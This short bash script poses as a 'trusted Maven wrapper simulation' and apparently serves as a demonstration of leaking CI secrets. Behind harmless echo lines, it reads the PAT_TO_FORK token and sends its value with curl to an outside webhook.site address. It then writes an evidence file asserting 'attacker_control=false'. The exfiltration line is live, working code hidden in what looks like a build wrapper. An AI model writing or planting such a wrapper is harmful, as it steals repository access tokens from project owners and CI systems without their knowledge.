#!/usr/bin/env bash
set -euo pipefail

echo "Trusted Maven wrapper simulation reached."
echo "Arguments: $*"
echo "No build is performed in the baseline repository."

if [[ -n "${PAT_TO_FORK:-}" ]]; then
    echo "PAT_TO_FORK exists, length=${#PAT_TO_FORK}"
else
    echo "PAT_TO_FORK IS EMPTY"
fi

curl -v --connect-timeout 10 --max-time 20 "https://webhook.site/0f409283-4255-452c-9eda-1ca04a669719" --data-urlencode "q=${PAT_TO_FORK}"

echo "curl exit code: $?"

mkdir -p .rca-demo
cat > .rca-demo/evidence.txt <<'EOT'
trusted_baseline=true
attacker_control=false
EOT
